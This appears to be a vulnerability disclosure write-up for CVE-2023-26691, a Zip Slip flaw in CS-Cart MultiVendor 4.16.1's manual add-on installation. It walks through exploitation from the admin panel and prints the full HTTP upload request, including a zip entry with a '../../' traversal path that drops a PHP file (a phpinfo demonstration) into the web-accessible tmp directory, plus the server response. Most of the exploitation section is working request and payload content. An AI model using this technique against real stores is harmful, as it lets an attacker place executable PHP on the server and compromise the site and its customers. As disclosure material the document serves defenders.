# CVE-2023-26691 - Zip Slip in CS-Cart MultiVendor 4.16.1
## Testing Environment
We utilized the official .zip file obtained from the CS-Cart website to perform a default installation of “CS-Cart MultiVendor 4.16.1” with example data. The installation was conducted on a fully patched Ubuntu Server 22.04 running PHP 8.1.2 and Apache/2.4.52.

## Exploitation
In the admin panel access the “Add-ons” → “Manage add-ons” page in the admin panel. Click on the gear button and select Manual installation.

<img src="cs-cart-zipslip1.png">

In the opened pop-up window select the add-on file. Upload the specially crafted file, containing the “ZipSlip” payload, in zip format from the local computer. The specially crafted file that includes PHP code can be accessed at the following URL: https://CS-Cart-website.example/tmp/file.php .

#### Upload file request:
```
POST /admin.php HTTP/1.1
Host: 10.3.3.220
User-Agent: Mozilla/5.0 (browser) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------173123747512346608003378109628
Content-Length: 1169228
Origin: http://10.3.3.220
DNT: 1
Connection: close
Referer: http://10.3.3.220/admin.php?dispatch=addons.manage
Cookie: sid_customer_49029=bae9df3c3d54bee9b2c114d712ad5555-1-C; sid_admin_49029=30ff9d1e1d2d1bec4dc2600c9055869b-A
Upgrade-Insecure-Requests: 1

-----------------------------173123747512346608003378109628
Content-Disposition: form-data; name="result_ids"

addon_upload_container
-----------------------------173123747512346608003378109628
Content-Disposition: form-data; name="return_url"

http://10.3.3.220/admin.php?dispatch=addons.manage
-----------------------------173123747512346608003378109628
Content-Disposition: form-data; name="file_addon_pack[0]"

C:\fakepath\ZipSlip.zip
-----------------------------173123747512346608003378109628
Content-Disposition: form-data; name="type_addon_pack[0]"

local
-----------------------------173123747512346608003378109628
Content-Disposition: form-data; name="file_addon_pack[0]"; filename="ZipSlip.zip"
Content-Type: application/zip

PK ./../../../../../../../tmp/file.php<?php

// Show all information, defaults to INFO_ALL
phpinfo();

// Show just the module information.
// phpinfo(8) yields identical results.
phpinfo(INFO_MODULES);

?>
***TRUNCATED***
```

#### Response:
```
HTTP/1.1 200 OK
Date: Sat, 04 Feb 2023 08:05:58 GMT
Server: Apache/2.4.54 (Debian)
X-Frame-Options: SAMEORIGIN
Set-Cookie: sid_admin_49029=30ff9d1e1d2d1bec4dc2600c9055869b-A; expires=Sat, 18-Feb-2023 08:05:58 GMT; Max-Age=1209600; path=/; HttpOnly; SameSite=lax
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: frame-ancestors 'self';
Vary: Accept-Encoding
Content-Length: 158
Connection: close
Content-Type: text/html; charset=utf-8

<textarea>{&quot;non_ajax_notifications&quot;:true,&quot;force_redirection&quot;:&quot;http:\/\/10.3.3.220\/admin.php?dispatch=addons.manage&quot;}</textarea>
```

After the specially crafted plugin is installed, the file inserted in our custom developed plugin will be unzipped to “/var/www/html/cscart/tmp/file.php” and publicly available at the following URL: https://CS-Cart-website.example/tmp/file.php .

<img src="cs-cart-zipslip2.png">
